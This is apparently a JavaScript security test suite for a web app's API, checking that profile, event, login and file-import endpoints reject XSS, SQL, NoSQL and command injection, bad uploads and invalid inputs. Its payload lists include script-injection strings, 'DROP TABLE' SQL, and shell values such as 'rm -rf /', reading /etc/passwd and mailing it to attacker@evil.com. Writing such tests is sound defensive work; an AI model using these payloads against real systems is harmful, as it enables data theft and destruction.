const request = require('supertest');
const app = require('../../src/app');
const { generatePayloads } = require('../utils/testUtils');

describe('Input Validation & Sanitization', () => {
  describe('XSS Prevention', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '"><script>alert("xss")</script>',
      '<img src="x" onerror="alert(\'xss\')">', 
      'javascript:alert("xss")',
      '<svg onload="alert(\'xss\')">', 
      '\'\');alert(\'xss\')//',
      '"; alert("xss"); //',
      '<iframe src="javascript:alert(\'xss\')">',
      '<link rel="import" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">'
    ];

    it('should sanitize user input in profile updates', async () => {
      const token = await getAuthToken();

      for (const payload of xssPayloads) {
        const response = await request(app)
          .put('/api/auth/profile')
          .set('Authorization', `Bearer ${token}`)
          .send({
            firstName: payload,
            lastName: payload,
            bio: payload
          });

        expect(response.status).toBe(200);
        expect(response.body.data.firstName).not.toContain('<script>');
        expect(response.body.data.lastName).not.toContain('<script>');
        expect(response.body.data.bio).not.toContain('<script>');
      }
    });

    it('should sanitize event content', async () => {
      const token = await getAuthToken();

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/events')
          .set('Authorization', `Bearer ${token}`)
          .send({
            title: payload,
            description: payload,
            location: payload
          });

        const eventData = response.body.data;
        expect(eventData.title).not.toMatch(/<[^>]*>/);
        expect(eventData.description).not.toMatch(/<script>/i);
        expect(eventData.location).not.toMatch(/javascript:/i);
      }
    });
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users; --",
      "') OR ('1'='1",
      "' OR 1=1; --",
      "admin'--",
      "' OR '1'='1' /*",
      "' AND 1=(SELECT COUNT(*) FROM tabname); --"
    ];

    it('should prevent SQL injection in authentication', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            email: payload,
            password: payload
          });

        expect(response.status).toBe(401);
        // Should not expose SQL errors
        expect(response.body.error.message).not.toMatch(/sql|query|syntax/i);
      }
    });

    it('should prevent SQL injection in query parameters', async () => {
      const token = await getAuthToken();

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get(`/api/events?search=${payload}&sort=${payload}`)
          .set('Authorization', `Bearer ${token}`);

        expect(response.status).toBe(200);
        // Should return empty results rather than error
        expect(response.body.data).toBeInstanceOf(Array);
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    const noSqlPayloads = [
      '{ "$gt": "" }',
      '{ "$ne": null }',
      '{ "$where": "function() { return true; }" }',
      '{ "$regex": ".*" }',
      '{"$gt": ""}',
      '{"$whereObj": {"$where": "function() { return true; }"}}'
    ];

    it('should prevent NoSQL injection attacks', async () => {
      for (const payload of noSqlPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            email: payload,
            password: 'password123'
          });

        expect(response.status).toBe(401);
        expect(response.body.error.message).not.toMatch(/mongodb|mongoose/i);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '`` rm -rf /',
      '$(echo vulnerable)',
      '; ping -c 4 attacker.com',
      '\n mail -s "hi" attacker@evil.com < /etc/passwd'
    ];

    it('should prevent command injection in file operations', async () => {
      const token = await getAuthToken();

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/events/import')
          .set('Authorization', `Bearer ${token}`)
          .attach('file', Buffer.from('test'), payload);

        expect(response.status).toBe(400);
        expect(response.body.error.message).not.toMatch(/error|exception|stack/i);
      }
    });
  });

  describe('File Upload Validation', () => {
    it('should validate file types', async () => {
      const token = await getAuthToken();
      
      const maliciousFiles = [
        { name: 'test.exe', type: 'application/x-msdownload' },
        { name: 'test.php', type: 'application/x-httpd-php' },
        { name: 'test.jsp', type: 'application/x-jsp' },
        { name: 'test.html', type: 'text/html' },
        { name: 'test.js', type: 'application/javascript' }
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/events/import')
          .set('Authorization', `Bearer ${token}`)
          .attach('file', Buffer.from('test'), {
            filename: file.name,
            contentType: file.type
          });

        expect(response.status).toBe(400);
        expect(response.body.error.code).toBe('INVALID_FILE_TYPE');
      }
    });

    it('should enforce file size limits', async () => {
      const token = await getAuthToken();
      const largeFile = Buffer.alloc(11 * 1024 * 1024); // 11MB

      const response = await request(app)
        .post('/api/events/import')
        .set('Authorization', `Bearer ${token}`)
        .attach('file', largeFile, 'large.csv');

      expect(response.status).toBe(400);
      expect(response.body.error.code).toBe('FILE_TOO_LARGE');
    });
  });

  describe('Data Validation', () => {
    it('should validate email addresses', async () => {
      const invalidEmails = [
        'notanemail',
        'still@not',
        '@invalid.com',
        'spaces in@email.com',
        'unicode@🌐.com',
        'multiple..dots@email.com',
        '.starts.with.dot@email.com'
      ];

      for (const email of invalidEmails) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            email,
            password: 'ValidP@ssw0rd123',
            firstName: 'Test',
            lastName: 'User'
          });

        expect(response.status).toBe(400);
        expect(response.body.error.code).toBe('VALIDATION_ERROR');
      }
    });

    it('should validate dates', async () => {
      const token = await getAuthToken();
      const invalidDates = [
        '2024-13-01',    // Invalid month
        '2024-04-31',    // Invalid day
        '2024/04/01',    // Wrong format
        'not-a-date',
        '2024-04-01T25:00:00Z', // Invalid hour
        '2023-04-01'     // Past date
      ];

      for (const date of invalidDates) {
        const response = await request(app)
          .post('/api/events')
          .set('Authorization', `Bearer ${token}`)
          .send({
            title: 'Test Event',
            startDate: date,
            endDate: '2024-04-02T00:00:00Z'
          });

        expect(response.status).toBe(400);
        expect(response.body.error.code).toBe('VALIDATION_ERROR');
      }
    });

    it('should sanitize and validate URLs', async () => {
      const token = await getAuthToken();
      const invalidUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'file:///etc/passwd',
        'ftp://malicious.com',
        '//evil.com',
        'https://evil.com@good.com'
      ];

      for (const url of invalidUrls) {
        const response = await request(app)
          .post('/api/events')
          .set('Authorization', `Bearer ${token}`)
          .send({
            title: 'Test Event',
            externalUrl: url
          });

        expect(response.status).toBe(400);
        expect(response.body.error.code).toBe('VALIDATION_ERROR');
      }
    });
  });
});

// Helper function to get auth token
async function getAuthToken() {
  const response = await request(app)
    .post('/api/auth/login')
    .send({
      email: 'test@example.com',
      password: 'TestP@ssw0rd123!'
    });

  return response.body.data.accessToken;
}